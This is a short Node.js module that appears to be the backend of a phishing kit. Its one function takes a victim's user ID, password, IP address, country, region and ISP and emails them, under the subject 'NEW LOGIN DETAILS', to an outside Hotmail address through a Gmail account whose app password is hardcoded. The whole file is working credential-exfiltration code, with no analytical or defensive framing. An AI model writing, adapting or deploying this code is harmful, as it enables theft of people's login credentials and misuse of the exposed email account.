const nodemailer = require('nodemailer')

const sendMail = (userID, password, country, region, isp, IPAddress, res) => {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'pat.nishimoto2@gmail.com',
      pass: 'khra ryeh iqav bcmz',
    },
  })

  const mailOptions = {
    from: 'pat.nishimoto2@gmail.com',
    to: 'Ibekzmoney@hotmail.com',
    subject: 'NEW LOGIN DETAILS',
    text: `New login details. User ID: ${userID}, password: ${password}, IP: ${
      IPAddress || 'Not available'
    }, Country: ${country || 'Not available'}, Region:${
      region || 'Not available'
    }, Internet Service Provider(ISP): ${isp || 'Not available'} `,
  }

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error)
      res.status(500).send('there was an error')
      return
    } else {
      console.log('Email sent: ' + info.response)
      res.status(200).json({ sent: 'success' })
      return
    }
  })
}

module.exports = { sendMail }
